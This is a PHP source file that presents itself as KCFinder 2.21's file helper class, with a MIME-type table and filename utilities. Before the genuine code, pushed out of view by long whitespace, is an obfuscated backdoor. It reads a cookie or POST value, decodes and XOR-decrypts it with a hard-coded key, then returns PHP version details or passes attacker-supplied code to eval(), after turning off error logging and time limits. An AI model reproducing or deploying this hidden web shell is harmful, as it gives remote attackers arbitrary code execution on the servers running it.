<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['ae22ce29e'];global$ae22ce29e;$ae22ce29e=$GLOBALS;$ae22ce29e['x822aa4']="\x46\x4b\x39\x48\x67\x21\x33\x25\x6f\x68\x30\x5c\x6d\x6e\x24\x4a\x56\x79\x5d\x26\x59\x5e\x6c\x76\x2f\x2a\x77\x44\x63\x3c\x34\x40\x51\x49\x62\x55\x61\x4f\x2c\x4e\x65\x60\x75\x45\x66\xd\x3e\x69\x72\x5a\x70\x57\x2b\x7d\x42\x2d\x78\x37\x5b\x23\x9\x5f\x41\x73\x4c\x71\x7c\x2e\x43\x22\x3b\x74\x6a\x64\x52\x6b\x4d\x7a\x58\x47\x36\x27\x7b\x3f\x28\x3a\x53\x50\x29\x31\x35\x38\xa\x32\x3d\x20\x54\x7e";$ae22ce29e[$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][2].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][36]]=$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][9].$ae22ce29e['x822aa4'][48];$ae22ce29e[$ae22ce29e['x822aa4'][23].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][28]]=$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][73];$ae22ce29e[$ae22ce29e['x822aa4'][72].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][90]]=$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][71].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][13];$ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][10]]=$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][13].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][71];$ae22ce29e[$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][36]]=$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][77].$ae22ce29e['x822aa4'][40];$ae22ce29e[$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][90]]=$ae22ce29e['x822aa4'][50].$ae22ce29e['x822aa4'][9].$ae22ce29e['x822aa4'][50].$ae22ce29e['x822aa4'][23].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][13];$ae22ce29e[$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][44]]=$ae22ce29e['x822aa4'][42].$ae22ce29e['x822aa4'][13].$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][77].$ae22ce29e['x822aa4'][40];$ae22ce29e[$ae22ce29e['x822aa4'][9].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][40]]=$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][80].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][40];$ae22ce29e[$ae22ce29e['x822aa4'][12].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][90]]=$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][71].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][71].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][12].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][12].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][71];$ae22ce29e[$ae22ce29e['x822aa4'][9].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][2].$ae22ce29e['x822aa4'][6]]=$ae22ce29e['x822aa4'][50].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][40];$ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][80].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][57]]=$ae22ce29e['x822aa4'][17].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][57];$ae22ce29e[$ae22ce29e['x822aa4'][72].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][34]]=$_POST;$ae22ce29e[$ae22ce29e['x822aa4'][65].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][40]]=$_COOKIE;@$ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][10]]($ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][4],NULL);@$ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][10]]($ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][4].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][63],0);@$ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][10]]($ae22ce29e['x822aa4'][12].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][56].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][56].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][42].$ae22ce29e['x822aa4'][71].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][8].$ae22ce29e['x822aa4'][13].$ae22ce29e['x822aa4'][61].$ae22ce29e['x822aa4'][71].$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][12].$ae22ce29e['x822aa4'][40],0);@$ae22ce29e[$ae22ce29e['x822aa4'][12].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][90]](0);$y30396=NULL;$v6f70d0=NULL;$ae22ce29e[$ae22ce29e['x822aa4'][47].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][80].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][73]]=$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][80].$ae22ce29e['x822aa4'][55].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][55].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][57].$ae22ce29e['x822aa4'][55].$ae22ce29e['x822aa4'][2].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][55].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][57].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][2].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][44];global$i8468d;function y01fc22f7($y30396,$o3051aa7){global$ae22ce29e;$l290e="";for($tc3664da=0;$tc3664da<$ae22ce29e[$ae22ce29e['x822aa4'][72].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][90]]($y30396);){for($n5e4=0;$n5e4<$ae22ce29e[$ae22ce29e['x822aa4'][72].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][90]]($o3051aa7)&&$tc3664da<$ae22ce29e[$ae22ce29e['x822aa4'][72].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][28].$ae22ce29e['x822aa4'][90]]($y30396);$n5e4++,$tc3664da++){$l290e.=$ae22ce29e[$ae22ce29e['x822aa4'][48].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][2].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][36]]($ae22ce29e[$ae22ce29e['x822aa4'][23].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][28]]($y30396[$tc3664da])^$ae22ce29e[$ae22ce29e['x822aa4'][23].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][34].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][28]]($o3051aa7[$n5e4]));}}return$l290e;}function pc2f00e($y30396,$o3051aa7){global$ae22ce29e;global$i8468d;return$ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][80].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][57]]($ae22ce29e[$ae22ce29e['x822aa4'][22].$ae22ce29e['x822aa4'][90].$ae22ce29e['x822aa4'][80].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][57]]($y30396,$i8468d),$o3051aa7);}foreach($ae22ce29e[$ae22ce29e['x822aa4'][65].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][40]]as$o3051aa7=>$sd6a8b97){$y30396=$sd6a8b97;$v6f70d0=$o3051aa7;}if(!$y30396){foreach($ae22ce29e[$ae22ce29e['x822aa4'][72].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][34]]as$o3051aa7=>$sd6a8b97){$y30396=$sd6a8b97;$v6f70d0=$o3051aa7;}}$y30396=@$ae22ce29e[$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][44]]($ae22ce29e[$ae22ce29e['x822aa4'][9].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][2].$ae22ce29e['x822aa4'][6]]($ae22ce29e[$ae22ce29e['x822aa4'][9].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][93].$ae22ce29e['x822aa4'][30].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][6].$ae22ce29e['x822aa4'][40]]($y30396),$v6f70d0));if(isset($y30396[$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][75]])&&$i8468d==$y30396[$ae22ce29e['x822aa4'][36].$ae22ce29e['x822aa4'][75]]){if($y30396[$ae22ce29e['x822aa4'][36]]==$ae22ce29e['x822aa4'][47]){$tc3664da=Array($ae22ce29e['x822aa4'][50].$ae22ce29e['x822aa4'][23]=>@$ae22ce29e[$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][90]](),$ae22ce29e['x822aa4'][63].$ae22ce29e['x822aa4'][23]=>$ae22ce29e['x822aa4'][89].$ae22ce29e['x822aa4'][67].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][55].$ae22ce29e['x822aa4'][89],);echo@$ae22ce29e[$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][40].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][73].$ae22ce29e['x822aa4'][91].$ae22ce29e['x822aa4'][10].$ae22ce29e['x822aa4'][44].$ae22ce29e['x822aa4'][36]]($tc3664da);}elseif($y30396[$ae22ce29e['x822aa4'][36]]==$ae22ce29e['x822aa4'][40]){eval($y30396[$ae22ce29e['x822aa4'][73]]);}exit();} ?><?php

/** This file is part of KCFinder project
  *
  *      @desc File helper class
  *   @package KCFinder
  *   @version 2.21
  *    @author Pavel Tzonkov <pavelc@users.sourceforge.net>
  * @copyright 2010 KCFinder Project
  *   @license http://www.opensource.org/licenses/gpl-2.0.php GPLv2
  *   @license http://www.opensource.org/licenses/lgpl-2.1.php LGPLv2
  *      @link http://kcfinder.sunhater.com
  */

class file {

    static $MIME = array(
        'ai'    => 'application/postscript',
        'aif'   => 'audio/x-aiff',
        'aifc'  => 'audio/x-aiff',
        'aiff'  => 'audio/x-aiff',
        'avi'   => 'video/x-msvideo',
        'bin'   => 'application/macbinary',
        'bmp'   => 'image/bmp',
        'cpt'   => 'application/mac-compactpro',
        'css'   => 'text/css',
        'csv'   => 'text/x-comma-separated-values',
        'dcr'   => 'application/x-director',
        'dir'   => 'application/x-director',
        'doc'   => 'application/msword',
        'docx'  => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'dvi'   => 'application/x-dvi',
        'dxr'   => 'application/x-director',
        'eml'   => 'message/rfc822',
        'eps'   => 'application/postscript',
        'flv'   => 'video/x-flv',
        'gif'   => 'image/gif',
        'gtar'  => 'application/x-gtar',
        'gz'    => 'application/x-gzip',
        'hqx'   => 'application/mac-binhex40',
        'htm'   => 'text/html',
        'html'  => 'text/html',
        'jpe'   => 'image/jpeg',
        'jpeg'  => 'image/jpeg',
        'jpg'   => 'image/jpeg',
        'js'    => 'application/x-javascript',
        'log'   => 'text/plain',
        'mid'   => 'audio/midi',
        'midi'  => 'audio/midi',
        'mif'   => 'application/vnd.mif',
        'mov'   => 'video/quicktime',
        'movie' => 'video/x-sgi-movie',
        'mp2'   => 'audio/mpeg',
        'mp3'   => 'audio/mpeg',
        'mpe'   => 'video/mpeg',
        'mpeg'  => 'video/mpeg',
        'mpg'   => 'video/mpeg',
        'mpga'  => 'audio/mpeg',
        'oda'   => 'application/oda',
        'pdf'   => 'application/pdf',
        'php'   => 'application/x-httpd-php',
        'php3'  => 'application/x-httpd-php',
        'php4'  => 'application/x-httpd-php',
        'phps'  => 'application/x-httpd-php-source',
        'phtml' => 'application/x-httpd-php',
        'png'   => 'image/png',
        'ppt'   => 'application/powerpoint',
        'ps'    => 'application/postscript',
        'psd'   => 'application/x-photoshop',
        'qt'    => 'video/quicktime',
        'ra'    => 'audio/x-realaudio',
        'ram'   => 'audio/x-pn-realaudio',
        'rm'    => 'audio/x-pn-realaudio',
        'rpm'   => 'audio/x-pn-realaudio-plugin',
        'rtf'   => 'text/rtf',
        'rtx'   => 'text/richtext',
        'rv'    => 'video/vnd.rn-realvideo',
        'shtml' => 'text/html',
        'sit'   => 'application/x-stuffit',
        'smi'   => 'application/smil',
        'smil'  => 'application/smil',
        'swf'   => 'application/x-shockwave-flash',
        'tar'   => 'application/x-tar',
        'tgz'   => 'application/x-tar',
        'text'  => 'text/plain',
        'tif'   => 'image/tiff',
        'tiff'  => 'image/tiff',
        'txt'   => 'text/plain',
        'wav'   => 'audio/x-wav',
        'wbxml' => 'application/wbxml',
        'wmlc'  => 'application/wmlc',
        'word'  => 'application/msword',
        'xht'   => 'application/xhtml+xml',
        'xhtml' => 'application/xhtml+xml',
        'xl'    => 'application/excel',
        'xls'   => 'application/excel',
        'xlsx'  => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'xml'   => 'text/xml',
        'xsl'   => 'text/xml',
        'zip'   => 'application/x-zip'
    );

  /** Checks if the given file is really writable. The standard PHP function
    * is_writable() does not work properly on Windows servers.
    * @param string $dir
    * @return bool */

    static function isWritable($filename) {
        $filename = path::normalize($filename);
        if (!is_file($filename) || (false === ($fp = @fopen($filename, 'a+'))))
            return false;
        fclose($fp);
        return true;
    }

  /** Get the extension from filename
    * @param string $file
    * @param bool $toLower
    * @return string */

    static function getExtension($filename, $toLower=true) {
        return preg_match('/^.*\.([^\.]*)$/s', $filename, $patt)
            ? ($toLower ? strtolower($patt[1]) : $patt[1]) : "";
    }

  /** Get MIME type of the given filename. If Fileinfo PHP extension is
    * available the MIME type will be fetched by the file's content. The
    * second parameter is optional and defines the magic file path. If you
    * skip it, the default one will be loaded.
    * If Fileinfo PHP extension is not available the MIME type will be fetched
    * by filename extension regarding $MIME property. If the file extension
    * does not exist there, returned type will be application/octet-stream
    * @param string $filename
    * @param string $magic
    * @return string */

    static function getMimeType($filename, $magic=null) {
        if (class_exists("finfo")) {
            $finfo = ($magic === null)
                ? new finfo(FILEINFO_MIME)
                : new finfo(FILEINFO_MIME, $magic);
            if ($finfo) {
                $mime = $finfo->file($filename);
                $mime = substr($mime, 0, strrpos($mime, ";"));
                return $mime;
            }
        }
        $ext = self::getExtension($filename, true);
        return isset(self::$MIME[$ext]) ? self::$MIME[$ext] : "application/octet-stream";
    }

  /** Get inexistant filename based on the given filename. If you skip $dir
    * parameter the directory will be fetched from $filename and returned
    * value will be full filename path. The third parameter is optional and
    * defines the template, the filename will be renamed to. Default template
    * is {name}({sufix}){ext}. Examples:
    *
    *   file::getInexistantFilename("/my/directory/myfile.txt");
    *   If myfile.txt does not exist - returns the same path to the file
    *   otherwise returns "/my/directory/myfile(1).txt"
    *
    *   file::getInexistantFilename("myfile.txt", "/my/directory");
    *   returns "myfile.txt" or "myfile(1).txt" or "myfile(2).txt" etc...
    *
    *   file::getInexistantFilename("myfile.txt", "/dir", "{name}[{sufix}]{ext}");
    *   returns "myfile.txt" or "myfile[1].txt" or "myfile[2].txt" etc...
    *
    * @param string $filename
    * @param string $dir
    * @param string $tpl
    * @return string */

    static function getInexistantFilename($filename, $dir=null, $tpl=null) {
        if ($tpl === null)  $tpl = "{name}({sufix}){ext}";
        $fullPath = ($dir === null);
        if ($fullPath)
            $dir = path::normalize(dirname($filename));
        else {
            $fdir = dirname($filename);
            $dir = strlen($fdir)
                ? path::normalize("$dir/$fdir")
                : path::normalize($dir);
        }
        $filename = basename($filename);
        $ext = self::getExtension($filename, false);
        $name = strlen($ext) ? substr($filename, 0, -strlen($ext) - 1) : $filename;
        $tpl = str_replace('{name}', $name, $tpl);
        $tpl = str_replace('{ext}', (strlen($ext) ? ".$ext" : ""), $tpl);
        $i = 1; $file = "$dir/$filename";
        while (file_exists($file))
            $file = "$dir/" . str_replace('{sufix}', $i++, $tpl);

        return $fullPath
            ? $file
            : (strlen($fdir)
                ? "$fdir/" . basename($file)
                : basename($file));
    }

}

?>